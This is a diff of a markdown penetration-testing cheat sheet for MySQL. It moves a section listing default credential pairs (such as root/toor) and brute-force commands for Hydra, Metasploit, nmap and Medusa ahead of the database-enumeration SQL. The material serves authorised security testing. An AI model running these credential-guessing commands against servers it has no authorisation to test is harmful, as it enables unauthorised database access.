@@ -57,6 +57,8 @@ mysql -h $TARGET -P 3306
 > [!NOTE]
 > Banner grabbing via `nc` may be unreliable because MySQL expects a client handshake. Sometimes you'll see version information (5.7.x or 8.0.x), but sometimes `nc` shows nothing or closes immediately. Use `nmap` or the MySQL client for more reliable results.
 
+## Authentication
+
 ### Authentication enumeration
 
 Check if MySQL allows anonymous connections or uses weak authentication.
@@ -69,7 +71,58 @@ nmap -p 3306 --script mysql-empty-password $TARGET
 nmap -p 3306 --script mysql-users --script-args mysqluser=root $TARGET
 ```
 
-### Database enumeration
+### Default credentials
+
+MySQL often uses default credentials, especially in development environments and on older servers:
+
+* `root` / `<empty>`
+* `root` / `root`
+* `root` / `toor`
+* `admin` / `admin`
+* `mysql` / `mysql`
+
+> [!NOTE]
+> Since MySQL 5.7+, installation creates a random password and forces the user to set it. Default credentials like `root/root` or `root/toor` are mainly found on:
+> * Old MySQL versions (pre-5.7)
+> * Development environments and labs
+> * Negligent administrator configurations
+
+### Bruteforce
+
+::: tabs
+
+=== Hydra
+
+```bash
+hydra -l root -P /path/to/passwords.txt $TARGET mysql
+```
+
+=== Metasploit
+
+```bash
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS $TARGET
+set USERNAME root
+set PASS_FILE /path/to/passwords.txt
+run
+```
+
+=== Nmap
+
+```bash
+nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET
+```
+
+=== Medusa
+
+```bash
+medusa -h $TARGET -u root -P /path/to/passwords.txt -M mysql
+```
+
+:::
+
+## Database enumeration
 
 Once authenticated, enumerate databases, tables, and users.
 
@@ -120,59 +173,6 @@ SELECT CURRENT_USER();
 -- Check user privileges
 SHOW GRANTS;
 SHOW GRANTS FOR 'username'@'host';
-```
-
-:::
-
-## Authentication
-
-### Default credentials
-
-MySQL often uses default credentials, especially in development environments and on older servers:
-
-* `root` / `<empty>`
-* `root` / `root`
-* `root` / `toor`
-* `admin` / `admin`
-* `mysql` / `mysql`
-
-> [!NOTE]
-> Since MySQL 5.7+, installation creates a random password and forces the user to set it. Default credentials like `root/root` or `root/toor` are mainly found on:
-> * Old MySQL versions (pre-5.7)
-> * Development environments and labs
-> * Negligent administrator configurations
-
-### Bruteforce
-
-::: tabs
-
-=== Hydra
-
-```bash
-hydra -l root -P /path/to/passwords.txt $TARGET mysql
-```
-
-=== Metasploit
-
-```bash
-msfconsole
-use auxiliary/scanner/mysql/mysql_login
-set RHOSTS $TARGET
-set USERNAME root
-set PASS_FILE /path/to/passwords.txt
-run
-```
-
-=== Nmap
-
-```bash
-nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET
-```
-
-=== Medusa
-
-```bash
-medusa -h $TARGET -u root -P /path/to/passwords.txt -M mysql
 ```
 
 :::
